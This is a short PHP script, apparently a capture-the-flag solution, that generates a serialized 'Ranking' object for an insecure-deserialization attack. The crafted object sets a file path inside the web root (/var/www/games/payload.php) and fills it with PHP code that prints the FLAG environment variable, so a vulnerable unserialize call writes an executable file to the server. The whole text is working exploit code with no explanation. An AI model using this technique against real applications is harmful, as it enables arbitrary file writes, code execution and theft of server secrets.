<?php
class Ranking{
  public $ranking = [];
  public $changed = false;
  public $path = "./games/ranking";
}

$r = new Ranking();

$r->ranking = "<?php echo getenv(\"FLAG\") . \"\\n\" ?>";
$r->path = "/var/www/games/payload.php";
$r->changed = true;

echo serialize($r) . "\n";

?>